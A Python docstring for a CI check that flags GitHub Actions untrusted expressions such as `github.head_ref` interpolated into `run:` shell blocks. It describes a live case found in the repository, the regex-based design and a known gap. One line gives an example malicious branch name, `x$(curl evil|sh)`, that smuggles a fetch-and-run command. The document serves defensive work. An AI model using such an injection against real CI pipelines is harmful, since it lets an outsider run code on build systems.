"""PROTECTED CORE (added 2026-07-08, see audit/lessons.md L4). Flags GitHub
Actions untrusted-context expressions interpolated directly into a `run:`
shell block instead of passed through `env:` -- the former is arbitrary code
execution in CI (a PR author names a branch `x$(curl evil|sh)` and it runs
verbatim inside the shell; git ref names permit $, `, ( ) unlike GitHub
logins), the latter is inert data the shell never re-parses.

Found live in .github/workflows/audit-guard.yml's own
`${{ github.head_ref }}` interpolation, which would have let any PR author
defeat the very guard meant to protect data/registers/ and
data/seen-items.json from a hand-edited PR -- see audit/lessons.md L4.

Deliberately regex-based, not a real YAML+shell parser -- narrow and
human-reviewable, the same tradeoff check_enum_constant_freeze.py's page.html
extraction makes (good enough to catch the known-risky pattern, not a
general-purpose static analyzer). A human reviewing a PR that adds a new
workflow step should still eyeball any `${{ }}` usage in `run:` -- this check
is a backstop, not a replacement for that.

Known limitation, not yet closed (see audit/lessons.md L6): a `run:` value
written as a multi-line quoted scalar (e.g. `run: 'echo\n  ${{ ... }}'`,
folding across lines without a `|`/`>` block indicator) has its continuation
lines silently dropped by `_run_blocks`, which only treats `|`/`>` as
multi-line. No workflow in this repo currently uses this style; flagged
here rather than silently assumed fixed.
